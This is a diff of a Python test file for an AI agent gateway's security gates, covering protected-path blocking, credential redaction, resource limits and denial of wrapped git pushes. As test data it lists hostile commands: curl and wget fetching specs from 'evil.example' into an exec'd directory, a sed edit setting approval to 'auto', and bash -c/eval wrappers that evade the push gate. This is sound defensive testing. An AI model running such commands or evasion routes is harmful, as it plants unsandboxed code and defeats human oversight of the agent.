-    part of the contract.
-    """
-
-    def test_relative_redirect_after_cd_is_blocked(self) -> None:
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"cd ~/.kiro/crew && echo forged > {leaf}",
-                f"cd $HOME/.kiro/crew; echo forged >> {leaf}",
-                # no space between the operator and the target
-                f"cd ~/.kirocrew && echo forged >{leaf}",
-                f"cd ~/.kiro/crew && echo forged > '{leaf}'",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bare_name_with_any_verb_is_blocked(self) -> None:
-        # Verb-independent, like the anchored branches: naming the file is the signal,
-        # so a novel or forgotten write verb cannot slip past an enumerated list.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"tee {leaf}",
-                f"touch {leaf}",
-                f"rm -f {leaf}",
-                f"mv /tmp/forged.json {leaf}",
-                f"cp /tmp/forged.json {leaf}",
-                f"cat {leaf}",
-                f"python -c \"open('{leaf}','w')\"",
-                f"install -m 600 /tmp/forged.json {leaf}",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_subdir_relative_spellings_are_blocked(self) -> None:
-        # A path SEPARATOR before the name is the common bare-relative spelling and is
-        # outside the ``[\s'\"=:,;]`` token anchor the anchored branches use.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"echo forged > ./{leaf}",
-                f"tee ./{leaf}",
-                f"cp /tmp/f.json crew/{leaf}",
-                f"echo forged > ../crew/{leaf}",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_windows_relative_spelling_is_blocked(self) -> None:
-        # Host-independent: the raw pass never depends on the runner's OS, and a
-        # backslash-relative name carries no anchor for the Windows leaf branch either.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"echo forged > .\\{leaf}",
-                f'copy /Y evil.json ".\\{leaf}"',
-                f"echo forged > crew\\{leaf}",
-                f"python -c \"open(r'.\\{leaf}','w')\"",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_unrelated_names_and_crew_content_stay_allowed(self) -> None:
-        # Bare-token matching is deliberately narrow: it fences ONE distinctive
-        # filename, not the crew home and not every name that contains it.
-        assert is_sensitive_bash_command("touch ~/.kiro/crew/sessions.db") is None
-        assert is_sensitive_bash_command("touch ~/.kirocrew/sessions.db") is None
-        assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            # a DIFFERENT file whose name merely ends with the protected one
-            assert is_sensitive_bash_command(f"touch my-{leaf}") is None
-            assert is_sensitive_bash_command(f"cat legacy-{leaf}") is None
-            # a longer name that merely starts with it
-            assert is_sensitive_bash_command(f"cat {leaf}x") is None
-            assert is_sensitive_bash_command(f"cat {leaf}5") is None
-
-    def test_generic_leaves_are_not_bare_matched(self) -> None:
-        # SCOPE GUARD: bare-token matching is only safe for a globally distinctive
-        # name. Admitting a generic leaf (``index.json``, ``config.json``,
-        # ``rotation.yaml``) would refuse a large fraction of ordinary commands, so the
-        # tuple must never grow one -- and the anchored forms must keep working.
-        for generic in ("index.json", "config.json", "rotation.yaml"):
-            assert generic not in security._BARE_TOKEN_PROTECTED_LEAVES
-            assert is_sensitive_bash_command(f"touch {generic}") is None
-        for leaf in security._WRITE_PROTECTED_BASH_LEAVES:
-            for prefix in security.crew_home_prefixes():
-                anchored = f"echo forged > ~/{prefix}/{leaf}"
-                assert is_sensitive_bash_command(anchored) is not None, anchored
+            assert not hasattr(security, name), name
 
 
 class TestKiroAgentsDirWriteProtection:
-    """``~/.kiro/agents`` is WRITE-protected on both the file-edit and bash gates.
+    """``~/.kiro/agents`` is WRITE-protected on the file-edit tool gate.
 
     A spec planted there names a ``command`` the MCP gateway execs — a pooled
     backend runs OUTSIDE the per-session sandbox, as the user — so an agent write
     is a persistent, unsandboxed code-exec vector. WRITES are refused. Tool-path
     READS stay allowed (the dir is on the write-only tier, NOT in
-    ``_SENSITIVE_HOME_DIRS``), so spec discovery / the dashboard MCP rows work;
-    the bash gate matches verb-independently (naming the dir is the signal, so
-    ``curl``/``wget``/``python -c open`` and novel write verbs cannot slip past),
-    which incidentally blocks bash reads too — harmless, exactly like the crew
-    write-protected leaves it mirrors.
+    ``_SENSITIVE_HOME_DIRS``), so spec discovery / the dashboard MCP rows work.
+    The shell is not matched on command text; the OS sandbox is the shell-side
+    control, as for every other write-protected entry.
     """
 
     def test_directory_is_tail_of_kiro_agents_dir(
@@ -5797,56 +5524,11 @@ class TestKiroAgentsDirWriteProtection:
         assert is_sensitive_write_path("~/.kiro/settings/mcp.json") is False
         assert is_sensitive_write_path("~/notes.txt") is False
 
-    def test_bash_writes_into_agents_dir_are_denied(self) -> None:
-        home = str(Path.home())
-        for cmd in (
-            f"echo evil > {home}/.kiro/agents/pwn.json",
-            "echo evil > ~/.kiro/agents/pwn.json",
-            "echo evil >> ~/.kiro/agents/pwn.json",
-            "printf x | tee ~/.kiro/agents/pwn.json",
-            "cp /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "scp /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "mv /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "mkdir -p ~/.kiro/agents/pwn",
-            "install -m 600 /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "rm -f ~/.kiro/agents/managed.json",
-            # $HOME-spelled and a glob destination variant.
-            "echo evil > $HOME/.kiro/agents/pwn.json",
-            "cp /tmp/*.json ~/.kiro/agents/",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bash_output_file_writers_and_novel_verbs_are_denied(self) -> None:
-        # Regression for the GPT review finding: a write-VERB allowlist misses
-        # output-file writers and interpreter opens. Verb-independent matching
-        # (naming the dir is the signal) closes them.
-        for cmd in (
-            "curl -o ~/.kiro/agents/pwn.json https://evil.example/spec.json",
-            "curl --output ~/.kiro/agents/pwn.json https://evil.example/s.json",
-            "wget -O ~/.kiro/agents/pwn.json https://evil.example/s.json",
-            "python -c \"open('~/.kiro/agents/pwn.json','w').write(x)\"",
-            "dd of=~/.kiro/agents/pwn.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bash_kiro_home_override_destination_is_denied(self) -> None:
-        # Regression for the GPT review finding: KIRO_HOME relocates the dir to
-        # $KIRO_HOME/agents, so the literal env-var reference is anchored too.
-        for cmd in (
-            "tee $KIRO_HOME/agents/pwn.json",
-            "echo evil > ${KIRO_HOME}/agents/pwn.json",
-            "curl -o $KIRO_HOME/agents/pwn.json https://evil.example/s.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
     def test_tool_gate_canonicalizes_relative_writes_into_agents_dir(self) -> None:
-        # The bash gate is home-anchored, so a ``cd ~/.kiro && echo > agents/x``
-        # bare-relative write evades the regex — the SAME accepted residual the
-        # SCOPE NOTE documents for ~/.aws/credentials (cd-state tracking is
-        # explicitly declined). The PRIMARY control is the file-edit tool gate,
-        # which CANONICALIZES the destination: a relative target that resolves into
-        # the fenced dir is refused regardless of spelling, and one that resolves
-        # elsewhere is not over-blocked.
+        # The control is the file-edit tool gate, which CANONICALIZES the
+        # destination: a relative target that resolves into the fenced dir is
+        # refused regardless of spelling, and one that resolves elsewhere is not
+        # over-blocked.
         from kiro_crew.security import is_sensitive_write_path
 
         home = str(Path.home())
@@ -5857,21 +5539,7 @@ class TestKiroAgentsDirWriteProtection:
         # dir (e.g. a project checkout) must stay allowed — no false fence.
         assert is_sensitive_write_path("agents/pwn.json", base_dir="/tmp/project") is False
 
-    def test_bash_naming_agents_dir_is_blocked_but_tool_reads_stay_allowed(self) -> None:
-        # The bash gate matches verb-independently, so a bash READ of the dir is
-        # blocked too (harmless: no secret, Python readers only) — the same
-        # tradeoff the crew write-protected leaves accept. The read-ALLOWANCE that
-        # matters (the file viewer, knowledge indexing, is_sensitive_path) lives on
-        # the tool path and is unaffected, asserted here so the asymmetry is pinned.
-        assert is_sensitive_bash_command("cat ~/.kiro/agents/foo.json") is not None
-        assert is_sensitive_path("~/.kiro/agents/foo.json") is False
-        # A DIFFERENT directory that merely shares the ``agents`` prefix is not
-        # over-blocked on the bash gate.
-        assert is_sensitive_bash_command("cat ~/.kiro/agents-backup/foo.json") is None
-
-    def test_kiro_home_override_is_covered_on_the_tool_gate(
-        self, tmp_path, monkeypatch
-    ) -> None:
+    def test_kiro_home_override_is_covered_on_the_tool_gate(self, tmp_path, monkeypatch) -> None:
         # kiro_agents_dir() honours KIRO_HOME; the override moves the specs the
         # gateway execs, so the write gate must follow it (re-anchored the same way
         # KIROCREW_HOME re-anchors the crew secrets). The default ~/.kiro/agents
@@ -5905,29 +5573,18 @@ class TestDeniedCommandsKeystone:
 
     The opt-out state (``{disable_all, disabled_ids, user_added}``) lives in
     ``~/.kirocrew/denied_commands.json`` on ``_SENSITIVE_HOME_DIRS`` — a full
-    read+write block — NOT in config.json. So the agent can neither read nor
-    write its own deny ceiling via any shell form, inheriting the mature
+    read+write block — NOT in config.json. So the agent's file tools can neither
+    read nor write its own deny ceiling, inheriting the mature
     ``is_sensitive_path`` gate (the same protection level as
-    ``security_policy.json``). This replaces the bespoke bash write-matcher that
-    was needed while the state lived in the agent-readable config.json.
+    ``security_policy.json``), and the OS sandbox mounts it read-only for the
+    shell. This replaces the bespoke bash write-matcher that was needed while the
+    state lived in the agent-readable config.json.
     """
 
     def test_keystone_path_is_sensitive(self) -> None:
         from kiro_crew.security import is_sensitive_path
 
         assert is_sensitive_path("~/.kirocrew/denied_commands.json") is True
-
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        # Full keystone: BOTH reads and writes of the opt-out file are blocked
-        # for the agent (it must not read OR write its own ceiling).
-        for cmd in (
-            "echo x > ~/.kirocrew/denied_commands.json",
-            "tee ~/.kirocrew/denied_commands.json",
-            "cp evil ~/.kirocrew/denied_commands.json",
-            "cat ~/.kirocrew/denied_commands.json",
-            "python -c open ~/.kirocrew/denied_commands.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
 
 
 class TestAuditBashCommand:
@@ -6089,7 +5746,7 @@ class TestRedactAndTruncate:
 
         Redaction runs over the full text before truncation. Truncating first
         would slice AKIA...EXAMPLE in half, leaving an unredactable prefix that
-        no longer matches the credential regex and would leak on the wire.
+        does not match the credential regex and would leak on the wire.
         """
         prefix = "prefix "  # 7 chars
         secret = "AKIAIOSFODNN7EXAMPLE"  # 20-char AWS access key ID
@@ -6100,6 +5757,85 @@ class TestRedactAndTruncate:
         assert len(result) <= max_chars
         # No fragment of the access key ID (which starts with "AKIA") survives.
         assert "AKIA" not in result
+
+
+class TestSELEmittersRedactBeforeTruncate:
+    """SEL metadata emitters must redact BEFORE truncating.
+
+    Slicing to 200 chars before redacting writes a credential straddling the
+    200-char boundary to the durable audit event with its tail cut off, in the
+    shape the credential regex cannot match. Each test plants the 20-char
+    AWS access key ID 'AKIAIOSFODNN7EXAMPLE' straddling index 200 and asserts no
+    fragment of it (its 'AKIA' prefix) survives in the emitted event's metadata.
+
+    These call the emitters DIRECTLY, so they pin the emitter's own ordering and
+    nothing about what a caller feeds it. Redaction here is case-sensitive by
+    design, so a caller that hands over a case-folded view defeats it while these
+    still pass; that half is pinned in test_push_branch_gate.py
+    (``test_allow_audit_records_the_raw_command_not_the_matching_view``).
+    """
+
+    SECRET = "AKIAIOSFODNN7EXAMPLE"  # 20-char AWS access key ID
+
+    def test_push_allow_event_redacts_straddling_secret(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        from kiro_crew import security
+
+        logged: list = []
+
+        class _RecorderLog:
+            def log(self, event: object) -> None:
+                logged.append(event)
+
+        monkeypatch.setattr(security, "SecurityEventLog", lambda: _RecorderLog())
+
+        # Build a push command whose token starts a few chars before index 200
+        # so the 20-char key straddles the 200-char cut, and the total length
+        # exceeds 200 chars.
+        prefix = "git push https://x:"
+        pad = "a" * (200 - len(prefix) - 4)
+        command = prefix + pad + self.SECRET + "@github.com/o/r " + "y" * 300
+        assert len(command) > 200
+        assert 200 - len(prefix + pad) < len(self.SECRET)  # key straddles the cut
+
+        security._emit_push_allow_event(command)
+
+        assert len(logged) == 1
+        event = logged[0]
+        assert event.event_type == "push_allowed"
+        assert not any("AKIA" in str(value) for value in event.metadata.values()), event.metadata
+
+    def test_injection_dropped_event_redacts_straddling_secret(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        from kiro_crew import security
+
+        logged: list = []
+
+        class _RecorderLog:
+            def log(self, event: object) -> None:
+                logged.append(event)
+
+        monkeypatch.setattr(security, "SecurityEventLog", lambda: _RecorderLog())
+
+        pad = "p" * (200 - 4)
+        sample = pad + self.SECRET + " " + "z" * 300
+        assert len(sample) > 200
+        assert 200 - len(pad) < len(self.SECRET)  # key straddles the cut
+
+        security.audit_injection_dropped(
+            surface="slack",
+            session_key="k",
+            channel_id="C",
+            thread_ts="1",
+            sample=sample,
+        )
+
+        assert len(logged) == 1
+        event = logged[0]
+        assert event.event_type == "prompt_injection_dropped"
+        assert not any("AKIA" in str(value) for value in event.metadata.values()), event.metadata
 
 
 class TestScanHistory:
@@ -6267,7 +6003,7 @@ class TestStreamRedactor:
     def test_terminal_long_jwt_not_bisected(self) -> None:
         """A terminal JWT longer than the 512-char DoS floor stays fully redacted.
 
-        security-review round-2 follow-up to without the JWT-aware cap the
+        Without the JWT-aware cap the
         default 512-char holdback would bisect a long terminal token, emitting the
         first (len-512) chars raw before flush() redacted only the held tail.
         """
@@ -6285,7 +6021,7 @@ class TestStreamRedactor:
     def test_terminal_long_jwe_not_bisected(self) -> None:
         """A 5-segment compact JWE longer than the 512 floor stays fully redacted.
 
-        security-review round-3 finding 1: `_PARTIAL_JWT_TAIL_RE`'s
+        `_PARTIAL_JWT_TAIL_RE`'s
         trailing-segment quantifier must admit 5 segments (a compact JWE
         header.key.iv.ciphertext.tag) so it escalates the cap instead of bisecting
         the >512-char JWE at the 512 floor and leaking its raw head.
@@ -6304,7 +6040,7 @@ class TestStreamRedactor:
     def test_terminal_long_opaque_bearer_not_bisected(self) -> None:
         """A >512-char opaque (non-JWT) Bearer token stays fully redacted.
 
-        security-review round-3 finding 2: opaque OAuth/refresh/SSO bearer
+        Opaque OAuth/refresh/SSO bearer
         tokens carry no `eyJ` header, so only the JWT anchor escalated the cap —
         an opaque bearer tail longer than 512 chars was bisected, streaming its
         head raw. `_BEARER_ANCHOR_PARTIAL_RE` now holds the whole anchor together
@@ -6323,7 +6059,7 @@ class TestStreamRedactor:
     def test_credential_anchored_tail_past_ceiling_fails_closed(self) -> None:
         """A credential-anchored tail past the 4096 ceiling fails closed.
 
-        security-review round-3 finding 3: a JWT/JWE/Bearer tail exceeding
+        A JWT/JWE/Bearer tail exceeding
         `_STREAM_HOLDBACK_JWT_MAX` must NOT be bisected (which would emit the
         token's head raw). feed() redacts+emits the safe prefix, appends the tag,
         and DROPS the oversized tail.
@@ -6342,7 +6078,7 @@ class TestStreamRedactor:
     def test_plain_cred_run_past_ceiling_still_committed(self) -> None:
         """A plain cred-class run with NO credential anchor is not dropped.
 
-        security-review round-3 no-data-loss guard: the fail-closed drop
+        No-data-loss guard: the fail-closed drop
         fires ONLY for a credential-anchored tail. A benign long alphanumeric run
         past the ceiling is still committed verbatim (bisected, no data loss),
         keeping the DoS bound intact without corrupting non-secret output.
@@ -6448,6 +6184,87 @@ class TestApplyResourceLimits:
         ):
             _bias_child_oom_score()
         mopen.assert_not_called()
+
+    @staticmethod
+    def _fake_resource(hard: int, *, reject: bool = False):
+        """A stand-in ``resource`` module so the preexec body runs IN-PROCESS.
+
+        The real closure runs post-fork in the child, where coverage cannot
+        see it and where calling it here would cap the test worker itself.
+        """
+        from types import SimpleNamespace
+
+        calls: list[tuple[int, tuple[int, int]]] = []
+
+        def setrlimit(res_id, limits):
+            if reject:
+                raise ValueError("kernel rejected")
+            calls.append((res_id, limits))
+
+        fake = SimpleNamespace(
+            RLIM_INFINITY=-1,
+            RLIMIT_NOFILE=7,
+            getrlimit=lambda _res_id: (100, hard),
+            setrlimit=setrlimit,
+        )
+        return fake, calls
+
+    def test_preexec_clamps_to_the_inherited_hard_cap_and_pins_both_limits(self) -> None:
+        """A request above the hard cap tightens to it; soft AND hard are set so the
+        child cannot raise its own soft limit back up."""
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=512)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == [(7, (512, 512))]
+        bias.assert_called_once_with()
+
+    def test_preexec_leaves_a_request_under_an_infinite_hard_cap_alone(self) -> None:
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=-1)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score"),
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == [(7, (4096, 4096))]
+
+    def test_preexec_swallows_a_rejected_rlimit_so_the_spawn_proceeds(self) -> None:
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=512, reject=True)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == []
+        bias.assert_called_once_with()
+
+    def test_preexec_is_a_noop_without_the_resource_module(self) -> None:
+        """Windows has no ``resource``; the limiter must still be a callable."""
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        with (
+            patch.object(helpers, "_resource", None),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            limiter = apply_resource_limits({"resource_limits": {"max_open_files": 4096}})
+            assert limiter() is None
+        bias.assert_not_called()
 
     @pytest.mark.skipif(sys.platform != "linux", reason="oom_score_adj is Linux-only")
     def test_child_oom_score_adj_biased(self) -> None:
@@ -6701,7 +6518,7 @@ class TestKiroCrewSlackAppCreateLink:
     The exemption is granted by VALIDATION, not by destination: the payload must
     reproduce the bundled template rendered with one alias. Every test below that
     perturbs the link asserts it goes back to being redacted, because the value
-    of this carve-out is precisely that it cannot be used to carry anything else.
+    of this carve-out is precisely that it cannot carry anything else.
     """
 
     def _payload(self, alias: str = "someone") -> str:
@@ -6734,7 +6551,7 @@ class TestKiroCrewSlackAppCreateLink:
     def test_the_real_emitters_produce_an_unredacted_link(self) -> None:
         """Both emitted links pass — driven through the emitters, not a rebuild.
 
-        The Design Review on #2725 called this out: rebuilding the payload inside
+        Design review calls this out: rebuilding the payload inside
         the test would let an emitter drift away from the validator with the tests
         still green, which is the same "no test exercised the real URL" failure
         that hid the original bug.
@@ -6768,7 +6585,7 @@ class TestKiroCrewSlackAppCreateLink:
     def test_secret_shaped_alias_is_still_redacted(self) -> None:
         """A credential parked in the alias slot does NOT ride through.
 
-        Regression for the blocking finding on #2725: the exemption used to zero
+        Guards the blocking finding: the exemption once zeroed
         the heuristic payload, and the alias slot accepted 64 chars of
         `[A-Za-z0-9_-]` — wide enough for a 40-char alphanumeric secret, which is
         exactly the run length `_EXFIL_PATTERNS` needs to fire. Two independent
@@ -6786,10 +6603,7 @@ class TestKiroCrewSlackAppCreateLink:
         payload = slack_manifest.stripped_template().replace(
             slack_manifest.ALIAS_PLACEHOLDER, secret40
         )
-        url = (
-            "https://api.slack.com/apps?new_app=1&manifest_yaml="
-            + quote(payload, safe="")
-        )
+        url = "https://api.slack.com/apps?new_app=1&manifest_yaml=" + quote(payload, safe="")
         assert scan_exfiltration_urls(url) != []
 
         # Within ALIAS_MAX but a recognised credential shape — caught on the
@@ -6803,9 +6617,11 @@ class TestKiroCrewSlackAppCreateLink:
         from kiro_crew import slack_manifest
         from kiro_crew.security import scan_exfiltration_urls
 
-        tampered = slack_manifest.stripped_template().replace(
-            slack_manifest.ALIAS_PLACEHOLDER, "real", 1
-        ).replace(slack_manifest.ALIAS_PLACEHOLDER, "other")
+        tampered = (
+            slack_manifest.stripped_template()
+            .replace(slack_manifest.ALIAS_PLACEHOLDER, "real", 1)
+            .replace(slack_manifest.ALIAS_PLACEHOLDER, "other")
+        )
         assert scan_exfiltration_urls(self._link(payload=tampered)) != []
 
     def test_arbitrary_payload_redacted(self) -> None:
@@ -6889,7 +6705,7 @@ class TestDashboardLinkTokenAcrossHostForms:
     narrow (the token stops being caught where the URL scanner never looked).
     The token shape mirrors `dashboard.token_auth.generate_token` —
     `base64url(payload).base64url(hmac)`, i.e. TWO segments, which is the case
-    that previously fell through to the bare-secret heuristic and survived ~74%
+    that falls through to the bare-secret heuristic and survives ~74%
     of the time (see the link-token alternative in `_CREDENTIAL_PATTERNS`).
     """
 
@@ -6910,7 +6726,7 @@ class TestDashboardLinkTokenAcrossHostForms:
             cleaned, _ = redact_credentials(f"http://{host}/?token={self._TOKEN}")
             assert self._TOKEN not in cleaned, host
             # The signature must not survive on its own either — a URL that still
-            # looks complete but no longer authenticates is the failure mode the
+            # looks complete but does not authenticate is the failure mode the
             # two-segment alternative was added for.
             assert "b" * 43 not in cleaned, host
 
@@ -6929,7 +6745,7 @@ class TestDashboardLinkTokenAcrossHostForms:
 
 
 class TestCronStoreProtection:
-    """The cron store is a keystone leaf (#4812).
+    """The cron store is a keystone leaf.
 
     ``crons.json`` holds access-control state, not just scheduling data:
     ``session_key`` decides which session may manage a job (and where its output
@@ -6940,7 +6756,8 @@ class TestCronStoreProtection:
     protected leaves, an auto-approved shell could bypass both with an ordinary
     file edit. It is on ``_CREW_SECRET_LEAVES`` with its ``cron-history``
     sidecar directory (per-job records plus the index), read+write-blocked on
-    both the tool path and the shell forms. The gateway's own writers open the
+    the tool path and hidden from the shell by the OS sandbox. The gateway's own
+    writers open the
     store directly, not through this gate, so the cron service keeps working;
     the cost is that a human hand-edit through an agent shell is refused, the
     same trade-off every other keystone leaf makes.
@@ -6954,6 +6771,11 @@ class TestCronStoreProtection:
 
         assert "crons.json" in _CREW_SECRET_LEAVES
         assert "cron-history" in _CREW_SECRET_LEAVES
+        # The in-flight markers are the evidence the boot-time loop-stall breaker
+        # pauses a job on, so they are fenced for a sharper reason than the store
+        # itself: a marker the agent could write is an unauthorized "pause this
+        # job", and one it could delete disables the breaker.
+        assert cron_inflight.RUNNING_DIR_NAME in _CREW_SECRET_LEAVES
 
     @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
     def test_store_and_history_sensitive_under_every_home_prefix(self, prefix: str) -> None:
@@ -6962,22 +6784,16 @@ class TestCronStoreProtection:
         assert is_sensitive_path(f"~/{prefix}/crons.json") is True
         assert is_sensitive_path(f"~/{prefix}/cron-history/_index.jsonl") is True
         assert is_sensitive_path(f"~/{prefix}/cron-history/job123.jsonl") is True
+        assert is_sensitive_path(f"~/{prefix}/cron-running/a1b2c3d4.json") is True
         # The write gate is a superset of the read gate; assert it directly so
         # the file-edit tool path is pinned too.
         assert is_sensitive_write_path(f"~/{prefix}/crons.json") is True
         assert is_sensitive_write_path(f"~/{prefix}/cron-history/_index.jsonl") is True
-
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        for cmd in (
-            "echo x > ~/.kiro/crew/crons.json",
-            "tee ~/.kiro/crew/crons.json",
-            "cp evil ~/.kiro/crew/crons.json",
-            'sed -i \'s/"approval_mode": ""/"approval_mode": "auto"/\' ~/.kiro/crew/crons.json',
-            "cat ~/.kiro/crew/crons.json",
-            "echo x > ~/.kiro/crew/cron-history/_index.jsonl",
-            "cat ~/.kirocrew/crons.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
+        assert is_sensitive_write_path(f"~/{prefix}/cron-running/a1b2c3d4.json") is True
+        assert (
+            is_sensitive_write_path(f"~/{prefix}/cron-running/{cron_inflight.BREAKER_CLAIM_FILE}")
+            is True
+        )
 
     def test_sibling_cron_names_are_not_over_blocked(self) -> None:
         from kiro_crew.security import is_sensitive_path, is_sensitive_write_path
@@ -6986,3 +6802,1871 @@ class TestCronStoreProtection:
         assert is_sensitive_path("~/projects/crontab.txt") is False
         assert is_sensitive_write_path("~/projects/crontab.txt") is False
         assert is_sensitive_path("~/.kiro/crew/workspace/crons.json.bak") is False
+
+
+class TestModelWeightsAreWriteProtected:
+    """Downloaded weights are an input to a trust decision, so the agent cannot write them.
+
+    Each store verifies its file against a pinned sha256 and then hands the PATH to a
+    native loader, so a writable directory leaves a window between the digest and the
+    open in which the bytes can be swapped. Re-hashing does not close it, because the
+    loader re-opens by name; removing the writability does. A poisoned model is
+    persistent and invisible, and for speech it means the user's own words reaching the
+    agent as something they did not say.
+
+    Paths are spelled ``~``-relative rather than derived from ``models_dir()``: the
+    conftest pins ``KIROCREW_HOME`` to a per-test temp directory, which is deliberately
+    NOT under the fenced home, so a derived path would test the fixture instead of the
+    fence.
+    """
+
+    #: Both stores land under the same parent, so one directory entry covers them.
+    MODEL_PATHS = (
+        "~/.kiro/crew/models/whisper/ggml-base.bin",
+        "~/.kiro/crew/models/qwen3-embedding-0.6b.gguf",
+        "~/.kirocrew/models/whisper/ggml-base.bin",
+    )
+
+    @pytest.mark.parametrize("path", MODEL_PATHS)
+    def test_the_file_tool_gate_refuses_a_write(self, path: str) -> None:
+        assert security.is_sensitive_write_path(path) is True, path
+
+    @pytest.mark.parametrize("path", MODEL_PATHS)
+    def test_reads_stay_allowed_at_the_tool_gate(self, path: str) -> None:
+        """Write-protected, NOT read+write sensitive: the settings surface and
+        `kirocrew doctor` both read the directory to report what is installed, and the
+        weights hold no secret."""
+        assert security.is_sensitive_path(path) is False, path
+
+    @pytest.mark.parametrize(
+        "command",
+        (
+            # A name that merely ENDS with a weight name stays allowed, the same
+            # boundary rule the alias record documents.
+            "cp my-ggml-base.bin /tmp/",
+            # An unrelated `.bin`, and an unrelated directory called `models`.
+            "cp firmware.bin /tmp/",
+            "cp /tmp/e models/a.bin",
+            "cd models && ls",
+            "grep -r models src/",
+            # Ordinary punctuation-separated commands, so widening the terminator class
+            # did not turn every `;` into a refusal.
+            "cd ~/Documents; ls",
+            "git status; git diff",
+        ),
+    )
+    def test_the_widened_boundary_does_not_refuse_ordinary_commands(self, command: str) -> None:
+        """The cost of the two widenings, pinned. Both are deny-list widenings, so the
+        only way they can be wrong is by refusing something ordinary."""
+        assert security.is_sensitive_bash_command(command) is None, command
+
+    def test_an_unrelated_path_named_models_is_not_fenced(self) -> None:
+        """Scoped to the crew home, so an ordinary project directory is unaffected."""
+        assert security.is_sensitive_write_path("~/code/myproject/models/weights.bin") is False
+
+
+class TestPublishFloorNestedPayloads:
+    """The publish floor must descend into nested shell payloads.
+
+    Every git-publish rule is stripped from the regex tier, so
+    ``_is_git_publish`` is the SOLE enforcement for pushes. It matched only the
+    top-level text, so a single wrapper was a complete bypass -- while the
+    self-protection floor beside it was already immune because it re-tokenizes
+    payloads through the same walk. These pin that the two floors now share it.
+    """
+
+    WRAPPED_PROTECTED = (
+        "bash -c 'git push origin main'",
+        "sh -c 'git push origin main'",
+        "bash -lc 'git push --force origin main'",
+        "bash -c -- 'git push origin mainline'",
+        "eval 'git push origin main'",
+        "bash <<< 'git push origin main'",
+        "bash -c 'bash -c \"git push origin main\"'",  # nested two deep
+        "$SHELL -c 'git push origin mainline'",
+        "bash -c 'git push --mirror origin'",
+        "echo 'git push origin main' | bash",
+    )
+
+    def test_wrapped_protected_push_denied(self) -> None:
+        from kiro_crew.security import is_denied
+
+        for cmd in self.WRAPPED_PROTECTED:
+            assert is_denied(cmd) is not None, cmd
+
+    def test_glued_command_flag_spelling_denied(self) -> None:
+        """``-c'<push>'`` (no space) is one token; the payload must still surface.
+
+        The bare-flag pattern rejects a token carrying the payload's own
+        characters, so the glued spelling was never yielded and the publish
+        floor -- whose ONLY enforcement is this walk -- never judged it.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "bash -c'git push origin main'",
+            'sh -c"git push origin main"',
+            "bash -lc'git push --force origin main'",
+            "bash -ec'git push origin mainline'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_end_of_options_terminator_does_not_hide_the_payload(self) -> None:
+        """``--`` ends option parsing, so the script is the token AFTER it.
+
+        ``eval -- '<script>'`` yielded the literal ``--`` as the payload, so the
+        real script was never walked and the push executed. The ``-c`` branch
+        already skipped the terminator; the verb branch did not.
+        """
+        from kiro_crew.security import _shell_payload_sources, is_denied
+
+        assert "git push origin main" in _shell_payload_sources("eval -- 'git push origin main'")
+        for cmd in (
+            "eval -- 'git push origin main'",
+            "eval -- -- 'git push origin mainline'",
+            "bash -c -- 'git push origin main'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_eval_concatenates_its_arguments_into_one_command(self) -> None:
+        """``eval a b c`` evaluates ``a b c``, so no single argument looks like one.
+
+        Taking only the first argument let the publish through: the walk handed
+        the hooks the bare program name and the verb sat in the next word, which
+        no check ever saw. Splitting across MORE words was already caught, because
+        each word then appears as its own token -- the gap was specifically the
+        program alone in one word and the whole verb-and-args tail glued into the
+        next.
+        """
+        from kiro_crew.security import _shell_payload_sources, is_denied
+
+        assert "git push origin main" in _shell_payload_sources("eval 'git' 'push origin main'")
+        for cmd in (
+            "eval 'git' 'push origin main'",
+            "eval -- 'git' 'push origin main'",
+            "eval 'git' 'push --force origin mainline'",
+            "eval 'git push' 'origin main'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_eval_join_does_not_over_block_ordinary_multi_word_eval(self) -> None:
